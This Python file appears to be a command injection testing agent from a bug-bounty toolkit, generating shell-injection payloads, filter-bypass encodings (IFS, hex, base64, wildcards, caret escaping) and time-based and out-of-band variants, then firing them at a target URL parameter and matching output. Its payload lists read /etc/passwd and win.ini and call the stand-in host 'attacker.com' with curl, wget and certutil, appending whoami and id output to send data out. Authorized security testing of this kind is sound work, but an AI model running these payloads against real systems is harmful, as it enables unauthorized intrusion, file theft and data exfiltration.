"""
OS Command Injection Tester Agent

Advanced OS command injection vulnerability testing agent. Detects command
injection vulnerabilities through inline command execution, blind injection,
time-based detection, and out-of-band techniques. Tests command chaining,
filter bypass, context-specific payloads, and shell metacharacter injection
across Unix/Linux and Windows platforms.

Tests for:
- Inline command execution with output
- Blind time-based injection (sleep, timeout, ping)
- Out-of-band detection (DNS, HTTP callbacks)
- Command chaining operators (;, |, ||, &&, &)
- Command substitution (backticks, $())
- Filter bypass techniques (quotes, variables, encoding)
- Context-specific injection (shell args, URLs, JSON)
- Platform-specific payloads (Unix/Linux, Windows)
- Encoding and obfuscation (hex, base64, wildcard)

Author: BountyHound Team
Version: 1.0.0
"""

from engine.core.tool_bridge import sync_nuclei_scan, sync_nmap_scan, sync_ffuf_fuzz, sync_sqlmap_test, sync_amass_enum, sync_gobuster_enum, sync_bloodhound_enum, sync_metasploit_execute, sync_nessus_scan, sync_volatility_analyze, sync_zeek_analyze
import re
import time
import base64
import urllib.parse
from typing import Dict, List, Tuple, Optional, Set, Any
from dataclasses import dataclass, field
from enum import Enum
from datetime import datetime, date
from colorama import Fore, Style
from engine.core.db_hooks import DatabaseHooks
from engine.core.database import BountyHoundDB
from engine.core.payload_hooks import PayloadHooks


try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False


class InjectionType(Enum):
    """Types of command injection"""
    INLINE = "inline"
    BLIND_TIME = "blind_time"
    BLIND_OOB = "blind_oob"
    BLIND_DNS = "blind_dns"
    BLIND_FILE = "blind_file"


class Platform(Enum):
    """Target platform"""
    UNIX = "unix"
    WINDOWS = "windows"
    UNKNOWN = "unknown"


class Context(Enum):
    """Injection context"""
    SHELL_ARG = "shell_argument"
    URL = "url_context"
    JSON = "json_context"
    XML = "xml_context"
    TEMPLATE = "template_context"
    SQL = "sql_context"
    UNKNOWN = "unknown"


class SeverityLevel(Enum):
    """Severity levels"""
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"


@dataclass
class CommandPayload:
    """Command injection payload"""
    payload: str
    injection_type: InjectionType
    platform: Platform
    operator: str
    command: str
    context: Context
    encoded: bool = False
    description: str = ""


@dataclass
class InjectionFinding:
    """Command injection finding"""
    endpoint: str
    parameter: str
    payload: str
    injection_type: InjectionType
    platform: Platform
    context: Context
    severity: SeverityLevel
    evidence: str
    command_output: str
    impact: str
    remediation: str
    cvss_score: float
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())

    def to_dict(self) -> Dict:
        """Convert finding to dictionary"""
        return {
            'endpoint': self.endpoint,
            'parameter': self.parameter,
            'payload': self.payload,
            'injection_type': self.injection_type.value,
            'platform': self.platform.value,
            'context': self.context.value,
            'severity': self.severity.value,
            'evidence': self.evidence,
            'command_output': self.command_output,
            'impact': self.impact,
            'remediation': self.remediation,
            'cvss_score': self.cvss_score,
            'timestamp': self.timestamp
        }


class ShellEncoder:
    """Shell command encoding and obfuscation"""

    @staticmethod
    def bash_variable_expansion(cmd: str) -> List[str]:
        """Bash variable expansion techniques"""
        variants = []

        # IFS expansion
        variants.append(cmd.replace(' ', '${IFS}'))
        variants.append(cmd.replace(' ', '$IFS'))

        # Empty variable
        chars = list(cmd)
        obfuscated = ''.join([f"{c}$@" if i % 2 else c for i, c in enumerate(chars)])
        variants.append(obfuscated)

        # Path variable
        if 'whoami' in cmd:
            variants.append(cmd.replace('whoami', '${PATH:0:1}${PATH:2:1}oami'))

        return variants

    @staticmethod
    def quote_evasion(cmd: str) -> List[str]:
        """Quote-based evasion"""
        variants = []

        # Single quotes
        quoted = "'".join(cmd)
        variants.append(quoted)

        # Double quotes
        quoted = '"'.join(cmd)
        variants.append(quoted)

        # Backslash escaping
        escaped = '\\'.join(cmd)
        variants.append(escaped)

        # Mixed quotes
        if len(cmd) > 2:
            mixed = f"{cmd[0]}'{cmd[1:-1]}'{cmd[-1]}"
            variants.append(mixed)

        return variants

    @staticmethod
    def hex_encoding(cmd: str) -> List[str]:
        """Hex encoding techniques"""
        variants = []

        # xxd method
        hex_str = cmd.encode().hex()
        variants.append(f"$(echo {hex_str} | xxd -r -p)")

        # printf method
        hex_chars = ''.join([f"\\x{ord(c):02x}" for c in cmd])
        variants.append(f"$(printf '{hex_chars}')")

        return variants

    @staticmethod
    def base64_encoding(cmd: str) -> List[str]:
        """Base64 encoding"""
        variants = []

        b64 = base64.b64encode(cmd.encode()).decode()

        # echo method
        variants.append(f"$(echo {b64} | base64 -d)")
        variants.append(f"`echo {b64} | base64 -d`")

        # Base64 with command substitution
        variants.append(f"${{IFS}}$(echo {b64} | base64 -d)")

        return variants

    @staticmethod
    def wildcard_abuse(cmd: str) -> List[str]:
        """Wildcard-based obfuscation"""
        variants = []

        if 'whoami' in cmd:
            variants.append(cmd.replace('whoami', '/usr/bin/who?mi'))
            variants.append(cmd.replace('whoami', '/*/bin/who*mi'))
            variants.append(cmd.replace('whoami', 'w??am?'))

        return variants

    @staticmethod
    def windows_encoding(cmd: str) -> List[str]:
        """Windows-specific encoding"""
        variants = []

        # Caret escaping
        escaped = '^'.join(cmd)
        variants.append(escaped)

        # Comma escaping
        if ' ' in cmd:
            variants.append(cmd.replace(' ', ','))

        # Semicolon
        if ' ' in cmd:
            variants.append(cmd.replace(' ', ';'))

        return variants


class PayloadGenerator:
    """Generate command injection payloads"""

    # Command operators
    UNIX_OPERATORS = [';', '|', '||', '&&', '&', '\n']
    WINDOWS_OPERATORS = ['&', '&&', '|', '||', '\n']

    # Detection commands
    UNIX_COMMANDS = {
        'basic': ['whoami', 'id', 'pwd', 'hostname', 'uname -a'],
        'file': ['cat /etc/passwd', 'head /etc/passwd', 'tail /etc/passwd'],
        'network': ['curl http://attacker.com', 'wget http://attacker.com'],
        'time': ['sleep 10', 'timeout 10', 'ping -c 10 127.0.0.1']
    }

    WINDOWS_COMMANDS = {
        'basic': ['whoami', 'hostname', 'ver', 'ipconfig', 'systeminfo'],
        'file': ['type C:\\windows\\win.ini', 'more C:\\boot.ini'],
        'network': ['ping -n 1 attacker.com', 'nslookup attacker.com'],
        'time': ['timeout 10', 'ping -n 10 127.0.0.1']
    }

    def __init__(self):
        self.encoder = ShellEncoder()

    def generate_inline_payloads(self, platform: Platform = Platform.UNIX) -> List[CommandPayload]:
        """Generate inline command injection payloads"""
        payloads = []

        operators = self.UNIX_OPERATORS if platform == Platform.UNIX else self.WINDOWS_OPERATORS
        commands = self.UNIX_COMMANDS if platform == Platform.UNIX else self.WINDOWS_COMMANDS

        for cmd_type, cmd_list in commands.items():
            if cmd_type == 'time':
                continue  # Skip time-based for inline

            for cmd in cmd_list:
                for operator in operators:
                    if operator == '\n':
                        payload_str = f"{operator}{cmd}"
                    else:
                        payload_str = f"{operator} {cmd}"

                    payloads.append(CommandPayload(
                        payload=payload_str,
                        injection_type=InjectionType.INLINE,
                        platform=platform,
                        operator=operator,
                        command=cmd,
                        context=Context.UNKNOWN,
                        description=f"Inline injection using {operator}"
                    ))

        return payloads

    def generate_blind_time_payloads(self, platform: Platform = Platform.UNIX, delay: int = 10) -> List[CommandPayload]:
        """Generate blind time-based payloads"""
        payloads = []

        operators = self.UNIX_OPERATORS if platform == Platform.UNIX else self.WINDOWS_OPERATORS
        commands = self.UNIX_COMMANDS['time'] if platform == Platform.UNIX else self.WINDOWS_COMMANDS['time']

        for cmd in commands:
            # Replace delay placeholder
            cmd = cmd.replace('10', str(delay))

            for operator in operators:
                if operator == '\n':
                    payload_str = f"{operator}{cmd}"
                else:
                    payload_str = f"{operator} {cmd}"

                payloads.append(CommandPayload(
                    payload=payload_str,
                    injection_type=InjectionType.BLIND_TIME,
                    platform=platform,
                    operator=operator,
                    command=cmd,
                    context=Context.UNKNOWN,
                    description=f"Blind time-based injection ({delay}s delay)"
                ))

        return payloads

    def generate_oob_payloads(self, collaborator_url: str, platform: Platform = Platform.UNIX) -> List[CommandPayload]:
        """Generate out-of-band payloads"""
        payloads = []

        operators = self.UNIX_OPERATORS if platform == Platform.UNIX else self.WINDOWS_OPERATORS

        if platform == Platform.UNIX:
            oob_commands = [
                f"curl http://{collaborator_url}",
                f"wget http://{collaborator_url}",
                f"nslookup {collaborator_url}",
                f"ping -c 1 {collaborator_url}",
                f"curl http://{collaborator_url}/$(whoami)",
                f"wget http://{collaborator_url}/`id`"
            ]
        else:
            oob_commands = [
                f"nslookup {collaborator_url}",
                f"ping -n 1 {collaborator_url}",
                f"certutil -urlcache -split -f http://{collaborator_url}"
            ]

        for cmd in oob_commands:
            for operator in operators:
                if operator == '\n':
                    payload_str = f"{operator}{cmd}"
                else:
                    payload_str = f"{operator} {cmd}"

                payloads.append(CommandPayload(
                    payload=payload_str,
                    injection_type=InjectionType.BLIND_OOB,
                    platform=platform,
                    operator=operator,
                    command=cmd,
                    context=Context.UNKNOWN,
                    description="Out-of-band callback injection"
                ))

        return payloads

    def generate_encoded_payloads(self, base_command: str = "whoami", platform: Platform = Platform.UNIX) -> List[CommandPayload]:
        """Generate encoded/obfuscated payloads"""
        payloads = []

        if platform == Platform.UNIX:
            # Bash variable expansion
            for variant in self.encoder.bash_variable_expansion(base_command):
                payloads.append(CommandPayload(
                    payload=f"; {variant}",
                    injection_type=InjectionType.INLINE,
                    platform=platform,
                    operator=';',
                    command=variant,
                    context=Context.UNKNOWN,
                    encoded=True,
                    description="Bash variable expansion"
                ))

            # Quote evasion
            for variant in self.encoder.quote_evasion(base_command):
                payloads.append(CommandPayload(
                    payload=f"; {variant}",
                    injection_type=InjectionType.INLINE,
                    platform=platform,
                    operator=';',
                    command=variant,
                    context=Context.UNKNOWN,
                    encoded=True,
                    description="Quote-based evasion"
                ))

            # Hex encoding
            for variant in self.encoder.hex_encoding(base_command):
                payloads.append(CommandPayload(
                    payload=f"; {variant}",
                    injection_type=InjectionType.INLINE,
                    platform=platform,
                    operator=';',
                    command=variant,
                    context=Context.UNKNOWN,
                    encoded=True,
                    description="Hex encoding"
                ))

            # Base64 encoding
            for variant in self.encoder.base64_encoding(base_command):
                payloads.append(CommandPayload(
                    payload=f"; {variant}",
                    injection_type=InjectionType.INLINE,
                    platform=platform,
                    operator=';',
                    command=variant,
                    context=Context.UNKNOWN,
                    encoded=True,
                    description="Base64 encoding"
                ))

            # Wildcard abuse
            for variant in self.encoder.wildcard_abuse(base_command):
                payloads.append(CommandPayload(
                    payload=f"; {variant}",
                    injection_type=InjectionType.INLINE,
                    platform=platform,
                    operator=';',
                    command=variant,
                    context=Context.UNKNOWN,
                    encoded=True,
                    description="Wildcard obfuscation"
                ))

        else:  # Windows
            for variant in self.encoder.windows_encoding(base_command):
                payloads.append(CommandPayload(
                    payload=f"& {variant}",
                    injection_type=InjectionType.INLINE,
                    platform=platform,
                    operator='&',
                    command=variant,
                    context=Context.UNKNOWN,
                    encoded=True,
                    description="Windows encoding"
                ))

        return payloads

    def generate_context_specific(self, context: Context, platform: Platform = Platform.UNIX) -> List[CommandPayload]:
        """Generate context-specific payloads"""
        payloads = []

        if context == Context.SHELL_ARG:
            # Shell argument context
            payloads.extend([
                CommandPayload(
                    payload="-option; whoami",
                    injection_type=InjectionType.INLINE,
                    platform=platform,
                    operator=';',
                    command='whoami',
                    context=context,
                    description="Option argument injection"
                ),
                CommandPayload(
                    payload="--flag=`whoami`",
                    injection_type=InjectionType.INLINE,
                    platform=platform,
                    operator='`',
                    command='whoami',
                    context=context,
                    description="Flag value injection"
                ),
                CommandPayload(
                    payload="-v $(whoami)",
                    injection_type=InjectionType.INLINE,
                    platform=platform,
                    operator='$(',
                    command='whoami',
                    context=context,
                    description="Verbose flag injection"
                )
            ])

        elif context == Context.URL:
            # URL context
            payloads.extend([
                CommandPayload(
                    payload="http://example.com|whoami",
                    injection_type=InjectionType.INLINE,
                    platform=platform,
                    operator='|',
                    command='whoami',
                    context=context,
                    description="URL pipe injection"
                ),
                CommandPayload(
                    payload="ftp://`whoami`@example.com",
                    injection_type=InjectionType.INLINE,
                    platform=platform,
                    operator='`',
                    command='whoami',
                    context=context,
                    description="URL username injection"
                )
            ])

        elif context == Context.JSON:
            # JSON context
            payloads.extend([
                CommandPayload(
                    payload='{"cmd": "; whoami"}',
                    injection_type=InjectionType.INLINE,
                    platform=platform,
                    operator=';',
                    command='whoami',
                    context=context,
                    description="JSON value injection"
                ),
                CommandPayload(
                    payload='{"exec": "$(whoami)"}',
                    injection_type=InjectionType.INLINE,
                    platform=platform,
                    operator='$(',
                    command='whoami',
                    context=context,
                    description="JSON command substitution"
                )
            ])

        return payloads

    def generate_all_payloads(self, platform: Platform = Platform.UNIX, collaborator_url: str = "attacker.com") -> List[CommandPayload]:
        """Generate all payload types"""
        all_payloads = []

        # Inline payloads
        all_payloads.extend(self.generate_inline_payloads(platform))

        # Blind time-based
        all_payloads.extend(self.generate_blind_time_payloads(platform))

        # Out-of-band
        all_payloads.extend(self.generate_oob_payloads(collaborator_url, platform))

        # Encoded payloads
        all_payloads.extend(self.generate_encoded_payloads("whoami", platform))

        # Context-specific
        for context in [Context.SHELL_ARG, Context.URL, Context.JSON]:
            all_payloads.extend(self.generate_context_specific(context, platform))

        return all_payloads


class TimeAnalyzer:
    """Analyze response times for blind injection"""

    def __init__(self, baseline_samples: int = 3):
        self.baseline_samples = baseline_samples
        self.baseline_time: Optional[float] = None
        self.threshold_multiplier = 0.9  # 90% of expected delay

    def establish_baseline(self, response_times: List[float]) -> float:
        """Establish baseline response time"""
        if len(response_times) < self.baseline_samples:
            return sum(response_times) / len(response_times)

        # Remove outliers and average
        sorted_times = sorted(response_times)
        middle_times = sorted_times[1:-1] if len(sorted_times) > 2 else sorted_times
        self.baseline_time = sum(middle_times) / len(middle_times)

        return self.baseline_time

    def is_delayed(self, response_time: float, expected_delay: int) -> bool:
        """Check if response indicates successful injection"""
        if self.baseline_time is None:
            return False

        # Check if response time is close to expected delay
        actual_delay = response_time - self.baseline_time
        threshold = expected_delay * self.threshold_multiplier

        return actual_delay >= threshold

    def calculate_confidence(self, response_time: float, expected_delay: int) -> float:
        """Calculate confidence level"""
        if self.baseline_time is None:
            return 0.0

        actual_delay = response_time - self.baseline_time
        expected_with_margin = expected_delay * self.threshold_multiplier

        if actual_delay < expected_with_margin:
            return 0.0

        # Calculate confidence based on how close to expected delay
        ratio = actual_delay / expected_delay
        if 0.9 <= ratio <= 1.1:
            return 0.95
        elif 0.8 <= ratio <= 1.2:
            return 0.85
        elif 0.7 <= ratio <= 1.3:
            return 0.70
        else:
            return 0.50


class ResponseAnalyzer:
    """Analyze responses for command injection evidence"""

    # Output patterns for common commands
    COMMAND_PATTERNS = {
        'whoami': [
            r'^[a-z_][a-z0-9_-]*\$?$',  # Unix username
            r'^[A-Z]+\\[a-zA-Z0-9_-]+$',  # Windows domain\user
            r'^[a-z0-9_-]+$'  # Simple username
        ],
        'id': [
            r'uid=\d+\([a-z0-9_-]+\)',
            r'gid=\d+\([a-z0-9_-]+\)',
            r'groups=.*'
        ],
        'pwd': [
            r'^/[a-zA-Z0-9/_-]*$',  # Unix path
            r'^[A-Z]:\\.*'  # Windows path
        ],
        'hostname': [
            r'^[a-zA-Z0-9][a-zA-Z0-9\.-]*$'
        ],
        'uname': [
            r'Linux',
            r'GNU/Linux',
            r'Darwin',
            r'x86_64'
        ],
        'ipconfig': [
            r'IPv4 Address',
            r'Subnet Mask',
            r'Default Gateway',
            r'Windows IP Configuration'
        ],
        '/etc/passwd': [
            r'root:x:0:0:',
            r'[a-z0-9_-]+:x:\d+:\d+:'
        ]
    }

    def __init__(self):
        self.time_analyzer = TimeAnalyzer()

    def analyze_inline(self, response: Dict, payload: CommandPayload) -> Optional[InjectionFinding]:
        """Analyze response for inline command injection"""
        content = response.get('body', '')
        status_code = response.get('status_code', 0)

        # Skip error responses (but 500 might still contain output)
        if status_code >= 400 and status_code != 500:
            return None

        # Look for command output patterns
        command_base = payload.command.split()[0]  # Get base command
        patterns = self.COMMAND_PATTERNS.get(command_base, [])

        matched_pattern = None
        for pattern in patterns:
            if re.search(pattern, content, re.MULTILINE | re.IGNORECASE):
                matched_pattern = pattern
                break

        if not matched_pattern:
            # Check for generic command output indicators
            if self._has_command_output_indicators(content):
                matched_pattern = "generic_output"
            else:
                return None

        # Extract command output
        command_output = self._extract_command_output(content, matched_pattern)

        # Determine severity
        severity = self._calculate_severity(payload, command_output)

        # Create finding
        finding = InjectionFinding(
            endpoint=response.get('url', ''),
            parameter=response.get('parameter', ''),
            payload=payload.payload,
            injection_type=payload.injection_type,
            platform=payload.platform,
            context=payload.context,
            severity=severity,
            evidence=content[:500],
            command_output=command_output,
            impact=self._generate_impact(payload),
            remediation=self._generate_remediation(),
            cvss_score=self._calculate_cvss(severity)
        )

        return finding

    def analyze_blind_time(self, response: Dict, payload: CommandPayload, expected_delay: int) -> Optional[InjectionFinding]:
        """Analyze response for blind time-based injection"""
        response_time = response.get('response_time', 0)

        if not self.time_analyzer.is_delayed(response_time, expected_delay):
            return None

        confidence = self.time_analyzer.calculate_confidence(response_time, expected_delay)

        if confidence < 0.70:
            return None

        # Create finding
        finding = InjectionFinding(
            endpoint=response.get('url', ''),
            parameter=response.get('parameter', ''),
            payload=payload.payload,
            injection_type=InjectionType.BLIND_TIME,
            platform=payload.platform,
            context=payload.context,
            severity=SeverityLevel.HIGH,
            evidence=f"Response delayed by {response_time - self.time_analyzer.baseline_time:.2f}s (expected: {expected_delay}s, confidence: {confidence:.0%})",
            command_output="",
            impact=self._generate_impact(payload),
            remediation=self._generate_remediation(),
            cvss_score=8.5
        )

        return finding

    def _has_command_output_indicators(self, content: str) -> bool:
        """Check for generic command output indicators"""
        indicators = [
            r'uid=',
            r'gid=',
            r'root:',
            r'/bin/bash',
            r'/bin/sh',
            r'C:\\Windows',
            r'C:\\Users',
            r'Linux',
            r'GNU/',
            r'IPv4'
        ]

        for indicator in indicators:
            if re.search(indicator, content, re.IGNORECASE):
                return True

        return False

    def _extract_command_output(self, content: str, pattern: str) -> str:
        """Extract command output from response"""
        if pattern == "generic_output":
            # Return first 200 characters
            return content[:200]

        # Find pattern match
        match = re.search(pattern, content, re.MULTILINE | re.IGNORECASE)
        if match:
            # Get context around match
            start = max(0, match.start() - 50)
            end = min(len(content), match.end() + 150)
            return content[start:end]

        return content[:200]

    def _calculate_severity(self, payload: CommandPayload, output: str) -> SeverityLevel:
        """Calculate finding severity"""
        # Check if sensitive data exposed
        if re.search(r'password|secret|key|token', output, re.IGNORECASE):
            return SeverityLevel.CRITICAL

        # Basic command execution
        if payload.command in ['whoami', 'id', 'hostname']:
            return SeverityLevel.CRITICAL

        # File read commands
        if 'passwd' in payload.command or 'win.ini' in payload.command:
            return SeverityLevel.CRITICAL

        return SeverityLevel.HIGH

    def _generate_impact(self, payload: CommandPayload) -> str:
        """Generate impact description"""
        impacts = {
            'whoami': "Arbitrary command execution confirmed. Attacker can execute any system command with application privileges.",
            'id': "Complete command injection allowing arbitrary command execution, file access, and potential privilege escalation.",
            '/etc/passwd': "Arbitrary file read via command injection, exposing system configuration and user data.",
            'curl': "Out-of-band command injection enabling data exfiltration and remote code execution.",
            'sleep': "Blind command injection confirmed, enabling time-based attacks and eventual data exfiltration."
        }

        for key, impact in impacts.items():
            if key in payload.command:
                return impact

        return "OS command injection vulnerability allowing arbitrary command execution."

    def _generate_remediation(self) -> str:
        """Generate remediation advice"""
        return """1. Never pass user input directly to system commands
2. Use parameterized APIs instead of shell execution
3. Implement strict input validation with whitelist approach
4. Use language-specific safe APIs (subprocess with shell=False, etc.)
5. Run application with minimum required privileges
6. Implement defense-in-depth with WAF rules"""

    def _calculate_cvss(self, severity: SeverityLevel) -> float:
        """Calculate CVSS score"""
        scores = {
            SeverityLevel.CRITICAL: 9.8,
            SeverityLevel.HIGH: 8.5,
            SeverityLevel.MEDIUM: 6.5,
            SeverityLevel.LOW: 4.0,
            SeverityLevel.INFO: 0.0
        }
        return scores.get(severity, 0.0)


class CommandInjectionTester:
    """Main command injection testing engine"""

    def __init__(self, target: Optional[str] = None, timeout: int = 10,
                 collaborator_url: str = "attacker.com", verify_ssl: bool = True):
        """
        Initialize command injection tester.

        Args:
            target: Target domain for database tracking
            timeout: Request timeout in seconds
            collaborator_url: OAST domain for OOB detection
            verify_ssl: Whether to verify SSL certificates
        """
        if not REQUESTS_AVAILABLE:
            raise ImportError("requests library is required. Install with: pip install requests")

        self.target = target
        self.timeout = timeout
        self.collaborator_url = collaborator_url
        self.verify_ssl = verify_ssl
        self.payload_gen = PayloadGenerator()
        self.analyzer = ResponseAnalyzer()
        self.findings: List[InjectionFinding] = []
        self.tests_run = 0
        self.tests_passed = 0

    def detect_platform(self, response: Dict) -> Platform:
        """Detect target platform"""
        headers = response.get('headers', {})
        server = headers.get('Server', '').lower()

        if 'iis' in server or 'microsoft' in server:
            return Platform.WINDOWS
        elif 'apache' in server or 'nginx' in server:
            return Platform.UNIX

        return Platform.UNKNOWN

    def test_endpoint(self, url: str, parameter: str, platform: Platform = Platform.UNIX,
                     test_inline: bool = True, test_blind: bool = True, test_oob: bool = False) -> List[InjectionFinding]:
        """
        Test endpoint for command injection.

        Args:
            url: Target URL
            parameter: Parameter name to inject
            platform: Target platform (UNIX/Windows)
            test_inline: Test inline injection
            test_blind: Test blind time-based injection
            test_oob: Test out-of-band injection

        Returns:
            List of findings
        """
        # Database check
        if self.target:
            print(f"{Fore.CYAN}[DATABASE] Checking history for {self.target}...{Style.RESET_ALL}")
            context = DatabaseHooks.before_test(self.target, 'os_command_injection_tester')

            if context['should_skip']:
                print(f"{Fore.YELLOW}[SKIP] {context['reason']}{Style.RESET_ALL}")
                if context.get('previous_findings'):
                    print(f"Previous findings: {len(context['previous_findings'])}")
                return []
            else:
                print(f"{Fore.GREEN}[OK] {context['reason']}{Style.RESET_ALL}")

        print(f"{Fore.CYAN}[*] Starting OS command injection testing...{Style.RESET_ALL}")
        print(f"[*] Target: {url}")
        print(f"[*] Parameter: {parameter}")
        print(f"[*] Platform: {platform.value}")

        findings = []

        # Generate payloads
        payloads = []
        if test_inline:
            payloads.extend(self.payload_gen.generate_inline_payloads(platform))
            payloads.extend(self.payload_gen.generate_encoded_payloads("whoami", platform))
        if test_blind:
            payloads.extend(self.payload_gen.generate_blind_time_payloads(platform))
        if test_oob:
            payloads.extend(self.payload_gen.generate_oob_payloads(self.collaborator_url, platform))

        # Establish baseline for time-based testing
        if test_blind:
            baseline_times = []
            for _ in range(3):
                start_time = time.time()
                try:
                    response = requests.get(url, params={parameter: "safe_value"},
                                          timeout=self.timeout, verify=self.verify_ssl)
                    baseline_times.append(time.time() - start_time)
                except Exception:
                    baseline_times.append(1.0)

            self.analyzer.time_analyzer.establish_baseline(baseline_times)
            print(f"[*] Baseline response time: {self.analyzer.time_analyzer.baseline_time:.2f}s")

        # Test each payload
        print(f"[*] Testing {len(payloads)} payloads...")
        for i, payload in enumerate(payloads):
            self.tests_run += 1

            if i % 10 == 0:
                print(f"[*] Progress: {i}/{len(payloads)}")

            try:
                # Make request with payload
                start_time = time.time()
                response = requests.get(
                    url,
                    params={parameter: payload.payload},
                    timeout=self.timeout,
                    verify=self.verify_ssl,
                    allow_redirects=False
                )
                response_time = time.time() - start_time

                response_data = {
                    'url': url,
                    'parameter': parameter,
                    'status_code': response.status_code,
                    'headers': dict(response.headers),
                    'body': response.text,
                    'response_time': response_time
                }

                # Analyze based on injection type
                finding = None
                if payload.injection_type == InjectionType.INLINE:
                    finding = self.analyzer.analyze_inline(response_data, payload)
                elif payload.injection_type == InjectionType.BLIND_TIME:
                    finding = self.analyzer.analyze_blind_time(response_data, payload, 10)

                if finding:
                    findings.append(finding)
                    self.findings.append(finding)
                    self.tests_passed += 1
                    print(f"{Fore.RED}[!] FOUND: {finding.severity.value.upper()} - {payload.description}{Style.RESET_ALL}")

                    # Record successful payload
                    if self.target:
                        PayloadHooks.record_success(
                            target=self.target,
                            vuln_type='OS_COMMAND_INJECTION',
                            payload=payload.payload,
                            context={'platform': platform.value, 'operator': payload.operator}
                        )

            except requests.exceptions.Timeout:
                # Timeout might indicate blind injection
                if payload.injection_type == InjectionType.BLIND_TIME:
                    print(f"{Fore.YELLOW}[?] Potential blind injection (timeout): {payload.description}{Style.RESET_ALL}")
            except Exception as e:
                # Skip errors
                pass

        print(f"{Fore.GREEN}[*] Testing complete: {self.tests_passed}/{self.tests_run} findings{Style.RESET_ALL}")

        # Record tool run
        if self.target:
            db = BountyHoundDB()
            db.record_tool_run(
                domain=self.target,
                tool_name='os_command_injection_tester',
                findings_count=len(findings),
                duration_seconds=0  # Calculate if needed
            )

        return findings

    def generate_report(self) -> Dict:
        """Generate comprehensive test report"""
        if not self.findings:
            return {
                'agent': 'os-command-injection-tester',
                'version': '1.0.0',
                'status': 'no_findings',
                'total_tests': self.tests_run,
                'findings': []
            }

        # Group by severity
        by_severity = {}
        for finding in self.findings:
            severity = finding.severity.value
            if severity not in by_severity:
                by_severity[severity] = []
            by_severity[severity].append(finding)

        return {
            'agent': 'os-command-injection-tester',
            'version': '1.0.0',
            'status': 'vulnerable',
            'total_tests': self.tests_run,
            'total_findings': len(self.findings),
            'critical': len(by_severity.get('critical', [])),
            'high': len(by_severity.get('high', [])),
            'medium': len(by_severity.get('medium', [])),
            'low': len(by_severity.get('low', [])),
            'findings': [f.to_dict() for f in self.findings]
        }


# Example usage
def main():
    """Example usage"""
    tester = CommandInjectionTester(target="example.com")

    findings = tester.test_endpoint(
        url="https://example.com/api/ping",
        parameter="host",
        platform=Platform.UNIX
    )

    report = tester.generate_report()
    print(json.dumps(report, indent=2))


if __name__ == "__main__":
    import json
    main()
